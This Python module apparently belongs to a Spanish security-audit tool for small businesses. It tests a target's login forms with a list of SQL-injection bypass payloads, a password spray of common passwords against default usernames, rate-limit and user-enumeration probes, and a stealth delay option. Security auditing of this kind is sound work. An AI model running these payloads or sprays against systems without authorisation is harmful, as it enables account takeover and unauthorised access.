"""
Módulo de auditoría de autenticación — AuditPyme
Detecta: login bypass SQLi, fuerza bruta sin rate limiting, enumeración de usuarios,
spray de contraseñas comunes y problemas de gestión de sesión.
"""

import requests
import urllib3
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 10
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

# Payloads de bypass de autenticación vía SQLi
LOGIN_BYPASS_PAYLOADS = [
    ("' OR '1'='1'--",     ""),               # clásico MySQL
    ("' OR 1=1--",         ""),
    ("admin'--",           ""),               # comentar la comprobación de password
    ("admin'#",            ""),               # MySQL comment
    ('" OR "1"="1"--',     ""),
    ("' OR 1=1#",          "x"),
    ("') OR ('1'='1'--",   ""),               # cierre de paréntesis
    ("' OR 1=1 LIMIT 1--", ""),
    ("admin' OR '1'='1",   "cualquiera"),     # sin comentario final
    ("' OR 'x'='x",        "' OR 'x'='x"),
    ("1' OR '1' = '1')) /*", ""),             # doble paréntesis
    ("' OR 1=1 --",        " "),              # espacio después del --
    ("\\",                 ""),               # escape character
    ("' OR true--",        ""),               # boolean moderno
    ("' || '1'='1'--",     ""),               # concatenación Oracle/PostgreSQL
]

# Contraseñas más usadas en pymes españolas + globales (spray conservador)
COMMON_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345",
    "1234567", "qwerty", "abc123", "111111", "dragon",
    "admin", "Admin1", "Admin123", "admin123", "Admin1234",
    "empresa", "empresa1", "empresa123",
    "temporal", "Temporal1", "pass1234",
    "Welcome1", "welcome123", "letmein",
    "P@ssw0rd", "Password1", "Passw0rd",
    "Summer2024", "Winter2024", "Spring2025",
    "Verano2024", "Verano2025", "Enero2025",
]

# Indicadores de login exitoso en la respuesta
SUCCESS_INDICATORS = [
    "dashboard", "panel", "bienvenido", "welcome", "logout",
    "cerrar sesión", "sign out", "mi cuenta", "my account",
    "perfil", "profile", "inicio", "home", "salir",
]

# Indicadores de login fallido
FAILURE_INDICATORS = [
    "contraseña incorrecta", "password incorrect", "wrong password",
    "invalid", "inválido", "error", "failed", "fallido",
    "no existe", "not found", "incorrecto", "incorrect",
    "usuario o contraseña", "username or password",
]


class AuthAuditor:
    def __init__(self, target: str, recon_data: dict = None, stealth: bool = False):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.stealth = stealth
        self.delay = 1.0 if stealth else 0.2
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._base_urls = self._build_base_urls()

    def scan(self) -> list:
        print(f"\n  [*] Auditoría de autenticación en: {self.target}")
        for base_url in self._base_urls:
            login_info = self._find_login_form(base_url)
            if not login_info:
                print(f"  [-] No se encontró formulario de login en {base_url}")
                continue
            login_url, user_field, pass_field, extra_fields = login_info
            print(f"  [+] Login encontrado: {login_url} (user={user_field}, pass={pass_field})")

            self._check_login_bypass(login_url, user_field, pass_field, extra_fields)
            self._check_rate_limiting(login_url, user_field, pass_field, extra_fields)
            self._check_user_enumeration(login_url, user_field, pass_field, extra_fields)
            self._check_password_spray(login_url, user_field, pass_field, extra_fields)
            self._check_session_fixation(base_url, login_url)

        if not self.findings:
            print("  [OK] No se detectaron vulnerabilidades críticas de autenticación")
        return self.findings

    # ── Descubrimiento del formulario de login ────────────────────────────────

    def _find_login_form(self, base_url: str):
        """Busca formulario de login en rutas comunes. Devuelve (url, user_field, pass_field, extra)."""
        login_paths = [
            "/login", "/login.php", "/login.asp", "/login.aspx",
            "/wp-login.php", "/admin/login", "/administrator",
            "/admin", "/user/login", "/cuenta/login", "/acceder",
            "/signin", "/sign-in", "/auth/login", "/panel/login",
            "/wp-admin", "/backend/login", "/backoffice", "/cms/login",
            "/shop/login", "/tienda/login", "/clientes/login",
        ]
        for path in login_paths:
            url = base_url.rstrip("/") + path
            try:
                r = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                if r.status_code != 200:
                    continue
                form_info = self._parse_login_form(r.text, r.url)
                if form_info:
                    return form_info
            except Exception:
                continue
        return None

    def _parse_login_form(self, html: str, page_url: str):
        """Extrae campos user/pass de un formulario HTML."""
        # Buscar formularios con campos de password
        forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL)
        for form_html in forms:
            inputs = re.findall(r'<input[^>]+>', form_html, re.IGNORECASE)
            fields = {}
            for tag in inputs:
                name_m  = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                type_m  = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                value_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                if name_m:
                    fields[name_m.group(1)] = {
                        "type":  type_m.group(1).lower() if type_m else "text",
                        "value": value_m.group(1) if value_m else "",
                    }

            pass_field = next((n for n, v in fields.items() if v["type"] == "password"), None)
            if not pass_field:
                continue
            user_field = next(
                (n for n in fields if any(k in n.lower() for k in ("user", "email", "login", "nombre", "name"))),
                next((n for n, v in fields.items() if v["type"] in ("text", "email")), None)
            )
            if not user_field:
                continue

            # Campos extra (tokens CSRF, hidden fields)
            extra = {n: v["value"] for n, v in fields.items()
                     if n not in (user_field, pass_field) and v["type"] != "submit"}
            return (page_url, user_field, pass_field, extra)
        return None

    # ── Check 1: Login bypass vía SQLi ───────────────────────────────────────

    def _check_login_bypass(self, login_url, user_field, pass_field, extra):
        print("  [*] Probando login bypass SQLi...")
        for user_payload, pass_payload in LOGIN_BYPASS_PAYLOADS:
            time.sleep(self.delay)
            data = dict(extra)
            data[user_field] = user_payload
            data[pass_field] = pass_payload or "cualquiera"
            try:
                r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
                if self._looks_like_success(r):
                    self._add(
                        "CRITICAL", "Login Bypass — Inyección SQL en autenticación",
                        f"Login bypass con payload '{user_payload}' en campo '{user_field}'. "
                        f"Respuesta HTTP {r.status_code} con indicadores de sesión activa.",
                        "El formulario de login concatena el input del usuario directamente en la consulta SQL. "
                        "Un atacante puede autenticarse como administrador sin conocer ninguna contraseña, "
                        "obteniendo acceso completo a la aplicación y sus datos.",
                        "Usar sentencias preparadas (PDO/PreparedStatement) para todas las consultas de autenticación. "
                        "Nunca concatenar input del usuario en SQL."
                    )
                    print(f"  [CRITICAL] Login bypass exitoso con: {user_payload[:50]}")
                    return  # Con uno es suficiente
            except Exception:
                continue
        print("  [OK] Login bypass SQLi no detectado")

    # ── Check 2: Rate limiting en login ──────────────────────────────────────

    def _check_rate_limiting(self, login_url, user_field, pass_field, extra):
        print("  [*] Comprobando rate limiting en login...")
        intentos = 20
        bloqueado = False
        tiempos = []

        for i in range(intentos):
            data = dict(extra)
            data[user_field] = "admin"
            data[pass_field] = f"password_falso_{i}"
            try:
                t0 = time.time()
                r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=False)
                elapsed = time.time() - t0
                tiempos.append(elapsed)
                # Signos de bloqueo: 429, redirect a captcha, respuesta muy lenta
                if r.status_code == 429:
                    bloqueado = True
                    print(f"  [OK] Rate limiting activo (HTTP 429 en intento {i+1})")
                    break
                if "captcha" in r.text.lower() or "locked" in r.text.lower() or "bloqueado" in r.text.lower():
                    bloqueado = True
                    print(f"  [OK] Protección detectada (captcha/bloqueo en intento {i+1})")
                    break
                # Introducir pequeño delay para no saturar
                time.sleep(0.1)
            except Exception:
                break

        if not bloqueado:
            avg = sum(tiempos) / len(tiempos) if tiempos else 0
            self._add(
                "HIGH", "Sin rate limiting en formulario de login",
                f"{intentos} intentos de login fallidos consecutivos sin ningún bloqueo ni ralentización "
                f"(tiempo medio de respuesta: {avg:.2f}s).",
                "Sin rate limiting, un atacante puede probar millones de contraseñas automáticamente (fuerza bruta). "
                "Muchas pymes usan contraseñas predecibles — con 1000 intentos se suele comprometer al menos una cuenta.",
                "Implementar bloqueo de cuenta tras 5-10 intentos fallidos, CAPTCHA después del 3er intento, "
                "y rate limiting por IP (máx. 10 req/min en /login). Usar frameworks como fail2ban o mod_evasive."
            )
            print(f"  [HIGH] Sin rate limiting — {intentos} intentos sin bloqueo")

    # ── Check 3: Enumeración de usuarios ─────────────────────────────────────

    def _check_user_enumeration(self, login_url, user_field, pass_field, extra):
        print("  [*] Comprobando enumeración de usuarios...")
        test_users = [
            ("admin",          "pass_falso_123"),
            ("usuario_falso_xyzabc999", "pass_falso_123"),
        ]
        responses = []
        for user, pwd in test_users:
            time.sleep(self.delay)
            data = dict(extra)
            data[user_field] = user
            data[pass_field] = pwd
            try:
                r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
                responses.append((user, r.status_code, len(r.text), r.text[:300].lower()))
            except Exception:
                responses.append((user, 0, 0, ""))

        if len(responses) == 2:
            _, sc1, len1, body1 = responses[0]
            _, sc2, len2, body2 = responses[1]
            # Diferencia en código de estado o tamaño de respuesta >5%
            size_diff = abs(len1 - len2) / max(len1, 1)
            if sc1 != sc2 or size_diff > 0.05:
                self._add(
                    "MEDIUM", "Enumeración de usuarios posible",
                    f"Respuestas distintas para usuario válido vs inválido: "
                    f"HTTP {sc1} ({len1} bytes) vs HTTP {sc2} ({len2} bytes). "
                    f"Diferencia de tamaño: {size_diff*100:.0f}%.",
                    "El servidor devuelve mensajes distintos según si el usuario existe o no. "
                    "Un atacante puede enumerar usuarios válidos del sistema, facilitando ataques dirigidos.",
                    "Usar siempre el mismo mensaje de error independientemente del motivo: "
                    "'Credenciales incorrectas' (nunca 'usuario no encontrado' vs 'contraseña incorrecta'). "
                    "El tiempo de respuesta también debe ser constante (usar timing-safe comparison)."
                )
                print(f"  [MEDIUM] Enumeración de usuarios posible (diff tamaño: {size_diff*100:.0f}%)")
            else:
                print("  [OK] Respuestas consistentes — enumeración no detectada")

    # ── Check 4: Password spray con contraseñas comunes ───────────────────────

    def _check_password_spray(self, login_url, user_field, pass_field, extra):
        print(f"  [*] Password spray ({len(COMMON_PASSWORDS)} contraseñas comunes)...")
        users_to_try = ["admin", "administrator", "user", "usuario", "webmaster", "info"]

        for user in users_to_try:
            for pwd in COMMON_PASSWORDS:
                time.sleep(self.delay)
                data = dict(extra)
                data[user_field] = user
                data[pass_field] = pwd
                try:
                    r = self.session.post(login_url, data=data, timeout=TIMEOUT, allow_redirects=True)
                    if self._looks_like_success(r):
                        self._add(
                            "CRITICAL", f"Credenciales débiles — acceso con {user}:{pwd}",
                            f"Login exitoso con usuario '{user}' y contraseña '{pwd}'. "
                            f"HTTP {r.status_code}, URL final: {r.url[:80]}",
                            f"La cuenta '{user}' usa una contraseña extremadamente común que cualquier atacante "
                            f"probaría en los primeros intentos de un ataque automatizado.",
                            f"Cambiar la contraseña de '{user}' inmediatamente por una de al menos 12 caracteres "
                            "con mayúsculas, minúsculas, números y símbolos. "
                            "Considerar autenticación de doble factor (2FA) para cuentas de administrador."
                        )
                        print(f"  [CRITICAL] Acceso con {user}:{pwd}")
                        return
                except Exception:
                    continue
        print("  [OK] Password spray no encontró credenciales válidas")

    # ── Check 5: Session fixation / no regeneración de sesión ────────────────

    def _check_session_fixation(self, base_url, login_url):
        print("  [*] Comprobando gestión de sesión...")
        try:
            # Obtener cookie antes del login
            sess_antes = requests.Session()
            sess_antes.headers.update({"User-Agent": UA})
            sess_antes.verify = False
            r1 = sess_antes.get(login_url, timeout=TIMEOUT)
            cookies_antes = dict(sess_antes.cookies)
            session_id_antes = self._extract_session_id(cookies_antes)

            # Comprobar si la app usa HTTPS para las cookies de sesión
            for name, cookie in sess_antes.cookies._cookies.get("", {}).get("/", {}).items():
                if any(s in name.lower() for s in ("session", "sess", "sid", "phpsessid", "jsessionid")):
                    if not getattr(cookie, "secure", False):
                        self._add(
                            "HIGH", f"Cookie de sesión '{name}' sin flag Secure",
                            f"La cookie de sesión '{name}' no tiene el atributo Secure. "
                            "Si el usuario accede por HTTP (aunque sea una sola vez), "
                            "la cookie puede ser interceptada en redes WiFi públicas.",
                            "Un atacante en la misma red WiFi puede robar la sesión activa del usuario "
                            "(session hijacking), obteniendo acceso completo a su cuenta sin conocer la contraseña.",
                            f"Añadir el atributo Secure a la cookie '{name}': "
                            "setcookie(name, value, ['secure'=>true, 'httponly'=>true, 'samesite'=>'Strict']). "
                            "Forzar HTTPS en toda la aplicación."
                        )
                        print(f"  [HIGH] Cookie '{name}' sin flag Secure")
                    if not getattr(cookie, "has_nonstandard_attr", lambda x: False)("HttpOnly"):
                        if "httponly" not in str(cookie).lower():
                            self._add(
                                "MEDIUM", f"Cookie de sesión '{name}' sin flag HttpOnly",
                                f"La cookie '{name}' no tiene HttpOnly — accesible via JavaScript (document.cookie).",
                                "Si hay XSS en la aplicación, un atacante puede robar todas las sesiones activas "
                                "con un simple script: document.cookie.",
                                f"Añadir HttpOnly a la cookie '{name}'. "
                                "En PHP: session_set_cookie_params(['httponly'=>true])."
                            )
                            print(f"  [MEDIUM] Cookie '{name}' sin HttpOnly")
        except Exception:
            pass

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _looks_like_success(self, response) -> bool:
        """Determina si la respuesta indica un login exitoso."""
        url = response.url.lower()
        body = response.text.lower()
        # Redirigido fuera del login → éxito
        if response.history and "login" not in url and "error" not in url:
            return True
        # Indicadores en el body
        if any(ind in body for ind in SUCCESS_INDICATORS):
            if not any(fail in body for fail in FAILURE_INDICATORS):
                return True
        return False

    def _extract_session_id(self, cookies: dict) -> str:
        for name in cookies:
            if any(s in name.lower() for s in ("session", "sess", "sid", "phpsessid")):
                return cookies[name]
        return ""

    def _build_base_urls(self) -> list:
        urls = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443, 8888):
                    proto = "https" if port in (443, 8443) else "http"
                    url = (f"{proto}://{self.target}:{port}"
                           if port not in (80, 443) else f"{proto}://{self.target}")
                    if url not in urls:
                        urls.append(url)
        return urls or [f"https://{self.target}"]

    def _add(self, severidad, nombre, descripcion, impacto, recomendacion):
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "severidad":     severidad,
            "tipo":          "AUTENTICACIÓN",
            "nombre":        nombre,
            "descripcion":   descripcion,
            "impacto":       impacto,
            "recomendacion": recomendacion,
        })
